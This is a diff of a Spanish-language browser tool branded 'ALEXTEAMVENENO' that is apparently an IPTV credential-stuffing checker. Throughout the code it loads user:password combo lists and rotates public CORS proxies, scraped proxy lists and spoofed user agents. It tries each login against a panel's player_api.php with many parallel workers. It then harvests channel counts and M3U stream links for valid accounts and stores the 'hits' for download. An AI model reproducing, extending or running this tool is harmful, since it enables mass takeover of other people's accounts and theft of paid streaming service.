+            <button class="btn btn-outline btn-block btn-sm" onclick="downloadAllFiles()" style="margin-top:8px;" id="btnDownloadAll" disabled>📥 DESCARGAR TODOS LOS HITS</button>
         </div>
     </div>
 
-    <div class="content-wrapper" id="dashboard">
-        <div class="banner"><span>☢️</span><span>TEAM VENENO · ALEX92</span><span>☢️</span></div>
-        <div class="signature">[ ALEXTEAMVENENO ]</div>
-        <div class="main-container">
-            <div class="left-panel">
-                <div class="card"><div class="card-title">📁 // COMBO_LOADER</div><div class="row"><input type="file" id="comboFile" accept=".txt" style="display:none;" onchange="handleComboFile(event)"><button onclick="document.getElementById('comboFile').click()" style="flex:1;">📂 LOAD FILE</button><span id="comboStatus" style="font-size:0.65em; color: var(--neon-cyan);">0 lines</span></div></div>
-                <div class="card"><div class="card-title">🌐 // PROXY_MATRIX</div><select id="proxyType"><option value="0">[ AUTO ] SOCKS5h</option><option value="1">[ HTTP ]</option><option value="2">[ SOCKS4 ]</option><option value="3">[ SOCKS5 ]</option></select><div class="row"><input type="file" id="proxyFile" accept=".txt" style="display:none;" onchange="handleProxyFile(event)"><button onclick="document.getElementById('proxyFile').click()" style="flex:1;">🔄 LOAD</button><button class="btn-save" onclick="scrapeProxies()" style="flex:1;background:rgba(0,30,50,0.9);border-color:rgba(0,255,255,0.4);color:var(--neon-cyan);" id="btnScrape">🌐 SCRAPE</button></div><span id="proxyStatus" style="font-size:0.65em; color: var(--neon-cyan);">> 0 proxies</span></div>
-                <div class="card"><div class="card-title">⚙️ // CONFIG</div><label>🌐 TARGET URL</label><input type="text" id="portals" placeholder="panel.com:80"><div class="row" style="margin-top:5px;"><div class="col"><label>🤖 THREADS</label><input type="number" id="threads" value="20" min="1" max="200"></div><div style="display:flex;gap:8px;align-items:flex-end;"><label style="color:var(--neon-cyan);"><input type="checkbox" id="useHttps"> SSL</label><label style="color:var(--neon-cyan);"><input type="checkbox" id="useProxies"> PROXY</label></div></div></div>
-                <div class="card"><div class="card-title">🎛️ // FILTER</div><div class="checkbox-row"><label><input type="checkbox" id="logInfo" checked> INFO</label><label style="color:var(--neon-green);"><input type="checkbox" id="logHits" checked> HITS</label><label style="color:var(--neon-red);"><input type="checkbox" id="logErrors" checked> ERR</label></div></div>
-                <div class="card" style="flex:1; display:flex; flex-direction:column;"><div class="card-title">📟 // CONSOLE</div><div class="console" id="console">> ALEXTEAMVENENO v16 · PROXY CORS<br>> Sistema listo...</div></div>
-            </div>
-            <div class="right-panel">
-                <div class="card"><div class="stats-grid"><div class="stat-box">🔍 SCANNED<span class="stat-value" id="statChecked">0</span></div><div class="stat-box stat-hits">✅ HITS<span class="stat-value" id="statHits">0</span></div><div class="stat-box stat-errors">❌ ERR<span class="stat-value" id="statErrors">0</span></div><div class="stat-box">📈 CPM<span class="stat-value" id="statCPM" style="color:var(--neon-yellow);">0</span></div></div><div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div><div class="progress-text" id="progressText">[ 0 / 0 ] 0%</div></div>
-                <div class="row" style="gap:4px;"><button class="btn-save" onclick="saveHitsToTxt()" style="flex:1;">💾 SAVE HITS</button><button class="btn-clear" onclick="clearHits()" style="flex:1;">🗑️ CLEAR</button><button class="btn-clear" onclick="doLogout()" style="flex:0;color:var(--neon-orange);">🚪 EXIT</button></div>
-                <div class="card" style="flex:1; display:flex; flex-direction:column; padding:6px;"><div class="card-title">⭐ // HIT DATABASE</div><div class="table-container"><table class="hits-table" id="hitsTable"><thead><tr><th>USER</th><th>PASS</th><th>STATUS</th><th>EXP</th><th>PANEL</th><th>CH</th><th>ESP</th><th>M3U</th></tr></thead><tbody id="hitsBody"></tbody></table></div></div>
-                <div class="row"><button class="btn-start" id="btnStart" onclick="startScan()">🚀 DEPLOY ATTACK</button><button class="btn-stop" id="btnStop" onclick="stopScan()" disabled>⬛ ABORT</button></div>
-            </div>
+    <!-- MODAL CATEGORÍAS -->
+    <div class="modal-overlay" id="modalCats" onclick="closeModal()">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <div class="modal-handle"></div>
+            <div class="modal-title">📂 DETALLES DEL HIT</div>
+            <div id="modalContent"></div>
+            <button class="modal-close" onclick="closeModal()">❌ CERRAR</button>
         </div>
-        <div class="footer-signature">[ ALEXTEAMVENENO ] · PROXY CORS · 2026</div>
     </div>
 
-    <div class="lang-indicator" id="langIndicator">🇪🇸</div>
     <div class="toast" id="toast"></div>
 
     <script>
+        // ==================== CONFIG ====================
         const VALID_USER = 'ALEX';
         const VALID_PASS = 'IPTV92';
         let isLoggedIn = false;
 
-        // 🔥 PROXY CORS - Lista de proxies para rotar
         const CORS_PROXIES = [
             'https://api.allorigins.win/raw?url=',
             'https://corsproxy.io/?',
             'https://thingproxy.freeboard.io/fetch/'
         ];
         let currentProxyIndex = 0;
-        function getNextCorsProxy() {
-            return CORS_PROXIES[currentProxyIndex++ % CORS_PROXIES.length];
-        }
+        function getNextCorsProxy() { return CORS_PROXIES[currentProxyIndex++ % CORS_PROXIES.length]; }
 
+        const state = {
+            comboLines: [], proxies: [], hits: [], isRunning: false,
+            stats: { checked: 0, hits: 0, errors: 0 }, startTime: 0,
+            totalCombos: 0, proxyIndex: 0, totalChannels: 0, totalSpain: 0
+        };
+
+        const USER_AGENTS = [
+            "VLC/3.0.20","ExoPlayerDemo/2.19.1","Kodi/20.2",
+            "Mozilla/5.0 (Linux; Android 14)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0.0.0"
+        ];
+        function getRandomUA() { return USER_AGENTS[Math.floor(Math.random()*USER_AGENTS.length)]; }
+
+        // ==================== LOGIN ====================
         function doLogin() {
-            if (document.getElementById('loginUser').value.trim() === VALID_USER && document.getElementById('loginPass').value === VALID_PASS) {
+            if (document.getElementById('loginUser').value.trim() === VALID_USER && 
+                document.getElementById('loginPass').value === VALID_PASS) {
                 isLoggedIn = true;
                 document.getElementById('loginScreen').style.display = 'none';
                 document.getElementById('welcomeScreen').style.display = 'flex';
@@ -248,8 +332,8 @@
                     document.getElementById('welcomeScreen').style.display = 'none';
                     document.getElementById('dashboard').style.display = 'block';
                     loadState();
-                    log('🔓 Bienvenido ALEX', 'hit');
-                }, 3000);
+                    loadExistingFiles();
+                }, 2500);
             } else {
                 document.getElementById('loginError').style.display = 'block';
                 document.getElementById('loginPass').value = '';
@@ -269,12 +353,11 @@
 
         document.addEventListener('keydown', e => { if (!isLoggedIn && e.key === 'Enter') doLogin(); });
 
-        const state = { comboLines:[], proxies:[], hits:[], isRunning:false, stats:{checked:0,hits:0,errors:0}, startTime:0, totalCombos:0, proxyIndex:0, totalChannels:0, totalSpain:0 };
-
+        // ==================== AUTO-SAVE ====================
         function saveState() {
             if (!isLoggedIn) return;
             try {
-                localStorage.setItem('alexAPKv2', JSON.stringify({
+                localStorage.setItem('alexState', JSON.stringify({
                     comboLines: state.comboLines.slice(0, 10000),
                     proxies: state.proxies.slice(0, 1000),
                     hits: state.hits.slice(-500),
@@ -289,157 +372,302 @@
 
         function loadState() {
             try {
-                const d = JSON.parse(localStorage.getItem('alexAPKv2'));
+                const d = JSON.parse(localStorage.getItem('alexState'));
                 if (!d) return;
                 if (d.comboLines) { state.comboLines = d.comboLines; state.totalCombos = d.totalCombos || d.comboLines.length; }
                 if (d.proxies) state.proxies = d.proxies;
-                if (d.hits) { state.hits = []; document.getElementById('hitsBody').innerHTML = ''; d.hits.forEach(h => addHitToTableSilent(h)); }
                 if (d.portals) document.getElementById('portals').value = d.portals;
                 if (d.threads) document.getElementById('threads').value = d.threads;
                 if (d.useHttps !== undefined) document.getElementById('useHttps').checked = d.useHttps;
                 if (d.useProxies !== undefined) document.getElementById('useProxies').checked = d.useProxies;
-                document.getElementById('comboStatus').textContent = `${state.totalCombos} lines`;
-                document.getElementById('proxyStatus').textContent = `> ${state.proxies.length} proxies`;
+                document.getElementById('comboStatus').textContent = `${state.totalCombos} combos`;
+                document.getElementById('proxyStatus').textContent = `${state.proxies.length} proxies`;
+                if (d.hits && d.hits.length > 0) {
+                    state.hits = [];
+                    document.getElementById('hitsContainer').innerHTML = '';
+                    d.hits.forEach(h => renderHitCard(h));
+                }
                 updateStats();
-                log('💾 Sesión restaurada', 'info');
+                log('💾 Sesión restaurada', 'i');
             } catch(e) {}
         }
 
         window.addEventListener('beforeunload', () => { if (isLoggedIn) saveState(); });
-        setInterval(() => { if (isLoggedIn && !state.isRunning) saveState(); }, 30000);
+        setInterval(() => { if (isLoggedIn && !state.isRunning) saveState(); }, 15000);
 
-        const USER_AGENTS = ["VLC/3.0.20","ExoPlayerDemo/2.19.1","Kodi/20.2","Dalvik/2.1.0","Mozilla/5.0 (Linux; Android 14)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0.0.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4)"];
-        function getRandomUA() { return USER_AGENTS[Math.floor(Math.random()*USER_AGENTS.length)]; }
-
-        function log(msg, type='info') {
-            if (!isLoggedIn) return;
-            if (type==='info' && !document.getElementById('logInfo').checked) return;
-            if (type==='hit' && !document.getElementById('logHits').checked) return;
-            if (type==='err' && !document.getElementById('logErrors').checked) return;
-            const el = document.getElementById('console'), line = document.createElement('div');
-            line.className = `log-${type}`;
-            line.textContent = `[${new Date().toLocaleTimeString('en-US',{hour12:false})}] ${type==='hit'?'[HIT]':type==='err'?'[ERR]':'[LOG]'} ${msg}`;
-            el.appendChild(line); el.scrollTop = el.scrollHeight;
+        // ==================== GUARDADO EN ARCHIVOS ====================
+        function saveHitToFile(portal, user, pass, m3u, canales, espana) {
+            const now = new Date();
+            const dateStr = now.toISOString().split('T')[0];
+            const timeStr = now.toLocaleTimeString('es-ES', {hour12: false});
+            const hitLine = `${user}:${pass} | CH:${canales||0} | ESP:${espana||0} | ${m3u} | ${dateStr} ${timeStr}\n`;
+            const panelFile = 'Hits/' + portal.replace(/[:/.]/g, '_') + '.txt';
+            appendToStorage(panelFile, hitLine);
+            appendToStorage('Hits/TODOS_LOS_HITS.txt', hitLine);
+            appendToStorage('Hits/USERPASS.txt', `${user}:${pass}\n`);
         }
 
-        function showToast(msg) { const t=document.getElementById('toast'); t.textContent=msg; t.style.display='block'; setTimeout(()=>t.style.display='none',2000); }
+        function appendToStorage(filename, content) {
+            try {
+                const existing = localStorage.getItem('f_' + filename) || '';
+                const updated = existing + content;
+                if (updated.length < 4000000) {
+                    localStorage.setItem('f_' + filename, updated);
+                } else {
+                    localStorage.setItem('f_' + filename, existing.slice(-2000000) + content);
+                }
+            } catch(e) {}
+        }
+
+        function loadExistingFiles() {
+            const allHits = localStorage.getItem('f_Hits/TODOS_LOS_HITS.txt') || '';
+            const lines = allHits.split('\n').filter(l => l.trim());
+            if (lines.length > 0) {
+                log(`📁 ${lines.length} hits guardados en archivos`, 'i');
+            }
+        }
+
+        function downloadAllFiles() {
+            const keys = Object.keys(localStorage).filter(k => k.startsWith('f_Hits/'));
+            if (keys.length === 0) { showToast('⚠️ No hay archivos', 'err'); return; }
+            let allContent = '☢️ ALEXTEAMVENENO · HITS\n' + '='.repeat(40) + '\n\n';
+            keys.forEach(key => {
+                const filename = key.replace('f_', '');
+                const content = localStorage.getItem(key);
+                if (content) {
+                    allContent += `📁 ${filename}\n${'─'.repeat(30)}\n${content}\n\n`;
+                }
+            });
+            const blob = new Blob([allContent], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = `ALEXTEAMVENENO_HITS_${new Date().toISOString().split('T')[0]}.txt`;
+            document.body.appendChild(a); a.click(); document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`📥 ${keys.length} archivos descargados`);
+            log(`📥 ${keys.length} archivos descargados`, 'h');
+        }
+
+        // ==================== UI ====================
+        function log(msg, type) {
+            if (!isLoggedIn) return;
+            if (type === 'i' && !document.getElementById('logInfo').checked) return;
+            if (type === 'h' && !document.getElementById('logHits').checked) return;
+            if (type === 'e' && !document.getElementById('logErrors').checked) return;
+            const el = document.getElementById('console');
+            const line = document.createElement('div');
+            line.className = type;
+            line.textContent = `[${new Date().toLocaleTimeString('en-US',{hour12:false})}] ${msg}`;
+            el.appendChild(line);
+            el.scrollTop = el.scrollHeight;
+            if (el.children.length > 50) el.removeChild(el.firstChild);
+        }
+
+        function showToast(msg, type) {
+            const t = document.getElementById('toast');
+            t.textContent = msg; t.className = 'toast ' + (type || '') + ' show';
+            clearTimeout(t._t); t._t = setTimeout(() => t.classList.remove('show'), 2000);
+        }
 
         function updateStats() {
-            const set=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v;};
-            set('statChecked',state.stats.checked); set('statHits',state.stats.hits); set('statErrors',state.stats.errors);
-            const speed = (Date.now()-state.startTime)>0 ? state.stats.checked/((Date.now()-state.startTime)/1000) : 0;
-            set('statCPM',Math.floor(speed*60));
-            document.getElementById('progressFill').style.width = state.totalCombos>0?(state.stats.checked/state.totalCombos*100)+'%':'0%';
-            set('progressText',`[ ${state.stats.checked} / ${state.totalCombos} ]`);
+            const set = (id, v) => { const e = document.getElementById(id); if (e) e.textContent = v; };
+            set('statChecked', state.stats.checked);
+            set('statHits', state.stats.hits);
+            set('statErrors', state.stats.errors);
+            set('hitCount', state.hits.length);
+            const pct = state.totalCombos > 0 ? (state.stats.checked / state.totalCombos * 100) : 0;
+            document.getElementById('progressFill').style.width = pct + '%';
+            set('progressText', `[ ${state.stats.checked} / ${state.totalCombos} ] ${pct.toFixed(1)}%`);
+            document.getElementById('btnDownloadAll').disabled = state.hits.length === 0;
         }
 
-        function addHitToTableSilent(h) {
-            state.hits.push(h);
-            const row=document.getElementById('hitsBody').insertRow(0), esc=s=>String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;');
-            row.innerHTML=`<td>${esc(h.user)}</td><td>${esc(h.pass)}</td><td>${esc(h.status||'Active')}</td><td>${esc(h.exp||'N/A')}</td><td>${esc(h.portal)}</td><td>${h.canales||0}</td><td>${h.espana||0}</td><td><span style="color:var(--neon-cyan);">M3U</span></td>`;
+        function renderHitCard(hitData) {
+            state.hits.push(hitData);
+            const container = document.getElementById('hitsContainer');
+            if (container.querySelector('.empty')) container.innerHTML = '';
+            
+            const card = document.createElement('div');
+            card.className = 'hit-card';
+            card.onclick = () => showHitDetails(hitData);
+            
+            const esc = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;');
+            card.innerHTML = `
+                <div class="hit-top">
+                    <div>
+                        <span class="hit-user">${esc(hitData.user)}</span>
+                        <span class="hit-pass">:${esc(hitData.pass)}</span>
+                    </div>
+                    <span style="font-size:0.65em;color:var(--muted);">${hitData.status||'Active'}</span>
+                </div>
+                <div class="hit-panel">🌐 ${esc(hitData.portal)} | 📅 ${esc(hitData.exp||'N/A')}</div>
+                <div class="hit-info">
+                    <span>📺 ${hitData.canales||0}</span>
+                    <span>🇪🇸 ${hitData.espana||0}</span>
+                </div>
+                <div class="hit-actions">
+                    <button class="hit-copy-btn" onclick="event.stopPropagation();copyText('${esc(hitData.user)}:${esc(hitData.pass)}')">📋 USER:PASS</button>
+                    <button class="hit-copy-btn" onclick="event.stopPropagation();copyText('${esc(hitData.m3u||'')}')">📋 M3U</button>
+                </div>
+            `;
+            container.insertBefore(card, container.firstChild);
         }
 
-        function addHitToTable(h) { addHitToTableSilent(h); state.totalChannels+=(h.canales||0); state.totalSpain+=(h.espana||0); saveState(); }
-
-        function saveHitsToTxt() {
-            if (!state.hits.length) { showToast('⚠️ No hay hits'); return; }
-            let c=`ALEXTEAMVENENO HITS\n${new Date().toISOString().split('T')[0]} | ${state.hits.length} hits\n\n`;
-            state.hits.forEach(h => { c+=`${h.user}:${h.pass} | ${h.portal} | CH:${h.canales||0} ESP:${h.espana||0}\n${h.m3u}\n\n`; });
-            const a=document.createElement('a'); a.href=URL.createObjectURL(new Blob([c],{type:'text/plain'})); a.download=`HITS_${new Date().toISOString().split('T')[0]}.txt`; document.body.appendChild(a); a.click(); document.body.removeChild(a);
-            showToast('💾 Guardado!');
+        function showHitDetails(hitData) {
+            const modal = document.getElementById('modalCats');
+            const content = document.getElementById('modalContent');
+            content.innerHTML = `
+                <p><b>👤 User:</b> ${hitData.user}</p>
+                <p><b>🔑 Pass:</b> ${hitData.pass}</p>
+                <p><b>🌐 Panel:</b> ${hitData.portal}</p>
+                <p><b>🟢 Status:</b> ${hitData.status||'Active'}</p>
+                <p><b>📅 Exp:</b> ${hitData.exp||'N/A'}</p>
+                <p><b>📺 Canales:</b> ${hitData.canales||0} | <b>🇪🇸 España:</b> ${hitData.espana||0}</p>
+                <p><b>🎬 Movies:</b> ${hitData.pelis||0} | <b>🍿 Series:</b> ${hitData.series||0}</p>
+                <p><b>🔗 M3U:</b> <span style="color:var(--cyan);word-break:break-all;">${hitData.m3u||'N/A'}</span></p>
+                ${hitData.categories && hitData.categories.length > 0 ? `
+                <p><b>📂 Categorías (${hitData.categories.length}):</b></p>
+                ${hitData.categories.map(c => `<span class="cat-tag">${c}</span>`).join(' ')}
+                ` : '<p><b>📂 Categorías:</b> No disponibles</p>'}
+            `;
+            modal.classList.add('show');
         }
 
-        function clearHits() { state.hits=[]; state.totalChannels=0; state.totalSpain=0; document.getElementById('hitsBody').innerHTML=''; updateStats(); saveState(); showToast('🗑️ Limpiado'); }
+        function closeModal() { document.getElementById('modalCats').classList.remove('show'); }
 
+        function copyText(text) {
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(text).then(() => showToast('✅ Copiado!'));
+            } else {
+                const ta = document.createElement('textarea');
+                ta.value = text; ta.style.cssText = 'position:fixed;opacity:0;';
+                document.body.appendChild(ta); ta.select();
+                document.execCommand('copy'); document.body.removeChild(ta);
+                showToast('✅ Copiado!');
+            }
+        }
+
+        // ==================== FILE HANDLERS ====================
         function handleComboFile(e) {
-            const f=e.target.files[0]; if(!f) return;
-            const r=new FileReader(); r.onload=ev=>{
-                state.comboLines=ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l.includes(':'));
-                state.totalCombos=state.comboLines.length; state.stats={checked:0,hits:0,errors:0}; state.hits=[]; state.totalChannels=0; state.totalSpain=0;
-                document.getElementById('hitsBody').innerHTML=''; document.getElementById('comboStatus').textContent=`${state.totalCombos} lines`;
-                log(`✅ ${state.totalCombos} combos cargados`, 'info'); updateStats(); saveState();
-            }; r.readAsText(f);
+            const f = e.target.files[0]; if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => {
+                state.comboLines = ev.target.result.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
+                state.totalCombos = state.comboLines.length;
+                state.stats = { checked: 0, hits: 0, errors: 0 };
+                state.hits = []; state.totalChannels = 0; state.totalSpain = 0;
+                document.getElementById('hitsContainer').innerHTML = '<div class="empty">👆 Carga un combo y despliega el ataque</div>';
+                document.getElementById('comboStatus').textContent = `${state.totalCombos} combos`;
+                updateStats(); saveState();
+                showToast(`✅ ${state.totalCombos} combos cargados`);
+            };
+            r.readAsText(f);
         }
 
         function handleProxyFile(e) {
-            const f=e.target.files[0]; if(!f) return;
-            const r=new FileReader(); r.onload=ev=>{
-                state.proxies=ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l&&!l.startsWith('#'));
-                document.getElementById('proxyStatus').textContent=`> ${state.proxies.length} proxies`; saveState();
-            }; r.readAsText(f);
+            const f = e.target.files[0]; if (!f) return;
+            const r = new FileReader();
+            r.onload = ev => {
+                state.proxies = ev.target.result.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+                document.getElementById('proxyStatus').textContent = `${state.proxies.length} proxies`;
+                saveState();
+                showToast(`✅ ${state.proxies.length} proxies cargados`);
+            };
+            r.readAsText(f);
         }
 
-        async function scrapeProxies() { showToast('🌐 Scraping...'); log('📥 Función scrape en desarrollo', 'info'); }
+        async function scrapeProxies() {
+            const btn = document.getElementById('btnScrape');
+            btn.disabled = true; btn.textContent = '⏳...';
+            log('📥 Scraping proxies...', 'i');
+            const sources = [
+                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
+                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt'
+            ];
+            const all = [];
+            for (const url of sources) {
+                try {
+                    const r = await fetch(getNextCorsProxy() + encodeURIComponent(url));
+                    const txt = await r.text();
+                    (txt.match(/\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b/g) || []).forEach(m => all.push(m));
+                } catch(e) {}
+            }
+            state.proxies = [...new Set(all)].slice(0, 500);
+            document.getElementById('proxyStatus').textContent = `${state.proxies.length} proxies`;
+            log(`✅ ${state.proxies.length} proxies scrapeados`, 'h');
+            saveState();
+            btn.disabled = false; btn.textContent = '🌐 SCRAPE';
+            showToast(`✅ ${state.proxies.length} proxies`);
+        }
 
-        // 🔥🔥🔥 FUNCIÓN CON PROXY CORS 🔥🔥🔥
-        async function checkCombo(line, portals, https, proxy) {
+        // ==================== CHECKER ====================
+        async function checkCombo(line, portals, https) {
             const parts = line.split(':');
             if (parts.length < 2) return { invalid: true };
             const user = parts[0].trim();
             const pass = parts.slice(1).join(':').trim();
             if (!user || !pass) return { invalid: true };
             const proto = https ? 'https' : 'http';
-
+            
             for (const portal of portals) {
                 if (!state.isRunning) return null;
                 const cp = portal.replace(/^https?:\/\//, '').replace(/\/$/, '');
                 const base = `${proto}://${cp}`;
-
                 try {
                     const ctrl = new AbortController();
-                    setTimeout(() => ctrl.abort(), 15000);
-
-                    // 🔥 USAR PROXY CORS
-                    const corsProxy = getNextCorsProxy();
+                    setTimeout(() => ctrl.abort(), 12000);
                     const targetUrl = `${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
-                    const fullUrl = corsProxy + encodeURIComponent(targetUrl);
-
-                    log(`🔍 Probando: ${user}:${pass} vía proxy...`, 'info');
-
-                    const r = await fetch(fullUrl, {
+                    const r = await fetch(getNextCorsProxy() + encodeURIComponent(targetUrl), {
                         signal: ctrl.signal,
                         headers: { 'User-Agent': getRandomUA() }
                     });
-
-                    if (r.status === 200) {
+                    if (r.ok) {
                         const txt = await r.text();
                         if (txt.toLowerCase().includes('active') || txt.toLowerCase().includes('exp_date')) {
-                            let d = {};
-                            try { d = JSON.parse(txt); } catch (e) {}
+                            let d = {}; try { d = JSON.parse(txt); } catch(e) {}
                             const ui = d.user_info || {};
-                            const exp = ui.exp_date ? new Date(parseInt(ui.exp_date) * 1000).toISOString().split('T')[0] : 'N/A';
+                            const exp = ui.exp_date ? new Date(parseInt(ui.exp_date)*1000).toISOString().split('T')[0] : 'N/A';
+                            let cats = [], can = 0, esp = 0, pel = 0, ser = 0;
+                            try {
+                                const cr = await fetch(getNextCorsProxy() + encodeURIComponent(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`));
+                                if (cr.ok) { const cd = await cr.json(); if (Array.isArray(cd)) cats = cd.map(c => c.category_name || 'Sin nombre'); }
+                            } catch(e) {}
+                            try {
+                                const lr = await fetch(getNextCorsProxy() + encodeURIComponent(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_streams`));
+                                if (lr.ok) { const ld = await lr.json(); if (Array.isArray(ld)) { can = ld.length; esp = ld.filter(c => { const n = (c.name||'').toLowerCase(); return n.includes('es ') || n.includes('espa'); }).length; } }
+                            } catch(e) {}
+                            try {
+                                const vr = await fetch(getNextCorsProxy() + encodeURIComponent(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_vod_streams`));
+                                if (vr.ok) { const vd = await vr.json(); if (Array.isArray(vd)) pel = vd.length; }
+                            } catch(e) {}
+                            try {
+                                const sr = await fetch(getNextCorsProxy() + encodeURIComponent(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_series`));
+                                if (sr.ok) { const sd = await sr.json(); if (Array.isArray(sd)) ser = sd.length; }
+                            } catch(e) {}
+                            
                             const m3u = `${base}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
                             return {
                                 hit: true,
-                                data: {
-                                    user, pass, exp,
-                                    status: ui.status || 'Active',
-                                    maxConn: ui.max_connections,
-                                    actConn: ui.active_cons,
-                                    portal: cp, m3u,
-                                    canales: 0, espana: 0, pelis: 0, series: 0,
-                                    categories: [],
-                                    proxy: proxy || 'Direct'
-                                }
+                                data: { user, pass, exp, status: ui.status||'Active', maxConn: ui.max_connections, actConn: ui.active_cons, portal: cp, m3u, canales: can, espana: esp, pelis: pel, series: ser, categories: cats, proxy: 'Direct' }
                             };
                         }
                     }
                     return { error: true };
-                } catch (e) {
-                    log(`❌ Error: ${e.message}`, 'err');
-                    return { error: true };
-                }
+                } catch(e) { return { error: true }; }
             }
             return { invalid: true };
         }
 
         async function startScan() {
-            if (!isLoggedIn || state.isRunning || !state.comboLines.length) return;
+            if (!isLoggedIn || state.isRunning || !state.comboLines.length) {
+                if (!state.comboLines.length) showToast('⚠️ Carga un combo primero', 'err');
+                return;
+            }
             const raw = document.getElementById('portals').value.trim();
-            if (!raw) { showToast('⚠️ Ingresa URL del panel'); return; }
+            if (!raw) { showToast('⚠️ Ingresa URL del panel', 'err'); return; }
             const portals = raw.split(',').map(p => p.trim()).filter(Boolean);
             if (!portals.length) return;
-            const threads = Math.min(parseInt(document.getElementById('threads').value) || 20, 50);
+            const threads = Math.min(parseInt(document.getElementById('threads').value) || 20, 30);
             const useHttps = document.getElementById('useHttps').checked;
 
             state.isRunning = true;
@@ -448,53 +676,61 @@
             state.totalChannels = 0;
             state.totalSpain = 0;
             state.startTime = Date.now();
-
+            document.getElementById('hitsContainer').innerHTML = '';
             document.getElementById('btnStart').disabled = true;
             document.getElementById('btnStop').disabled = false;
-            document.getElementById('hitsBody').innerHTML = '';
-
-            log('🚀 ATAQUE INICIADO (Proxy CORS)', 'warn');
-            log(`🎯 ${portals.join(', ')} | ⚙️ ${threads} threads | ${useHttps?'SSL':'No SSL'}`, 'info');
-
+            
+            log('🚀 ATAQUE INICIADO', 'h');
+            
             const queue = [...state.comboLines];
             let qi = 0;
             const total = queue.length;
-
+            
             const worker = async () => {
                 while (state.isRunning && qi < total) {
                     const ci = qi++;
                     if (ci >= total) break;
                     const line = queue[ci];
                     if (!line || !line.includes(':')) { state.stats.checked++; continue; }
-                    const res = await checkCombo(line, portals, useHttps, null);
+                    const res = await checkCombo(line, portals, useHttps);
                     state.stats.checked++;
                     if (res?.hit) {
                         state.stats.hits++;
-                        log(`💥 HIT! ${res.data.user}:${res.data.pass} @ ${res.data.portal}`, 'hit');
-                        addHitToTable(res.data);
-                        updateStats();
+                        state.totalChannels += (res.data.canales || 0);
+                        state.totalSpain += (res.data.espana || 0);
+                        renderHitCard(res.data);
+                        saveHitToFile(res.data.portal, res.data.user, res.data.pass, res.data.m3u, res.data.canales, res.data.espana);
+                        log(`💥 HIT! ${res.data.user}:${res.data.pass} @ ${res.data.portal}`, 'h');
                     } else if (res?.error) {
                         state.stats.errors++;
+                        if (state.stats.errors % 20 === 0) log(`❌ ${state.stats.errors} errores`, 'e');
                     }
                     if (state.stats.checked % 10 === 0) updateStats();
-                    if (state.stats.checked % 20 === 0) await new Promise(r => setTimeout(r, 50));
+                    if (state.stats.checked % 30 === 0) await new Promise(r => setTimeout(r, 100));
                 }
             };
-
+            
             await Promise.all(Array(Math.min(threads, total)).fill().map(() => worker()));
-
+            
             state.isRunning = false;
             document.getElementById('btnStart').disabled = false;
             document.getElementById('btnStop').disabled = true;
             updateStats();
             saveState();
-            const elapsed = ((Date.now() - state.startTime) / 1000).toFixed(1);
-            log(`🎯 FIN en ${elapsed}s | Hits: ${state.stats.hits} | Errores: ${state.stats.errors} [ALEXTEAMVENENO]`, 'warn');
-            showToast(`✅ ${state.stats.hits} hits!`);
+            const elapsed = ((Date.now() - state.startTime)/1000).toFixed(1);
+            log(`🎯 FIN en ${elapsed}s | Hits: ${state.stats.hits} | Errores: ${state.stats.errors}`, 'h');
+            showToast(`✅ ${state.stats.hits} hits encontrados`);
         }
 
-        function stopScan() { state.isRunning = false; document.getElementById('btnStop').disabled = true; saveState(); }
+        function stopScan() {
+            state.isRunning = false;
+            document.getElementById('btnStop').disabled = true;
+            document.getElementById('btnStart').disabled = false;
+            saveState();
+            log('⬛ ESCANEO DETENIDO', 'i');
+        }
 
+        // ==================== INIT ====================
         function init() {
             document.getElementById('dashboard').style.display = 'none';
             document.getElementById('welcomeScreen').style.display = 'none';
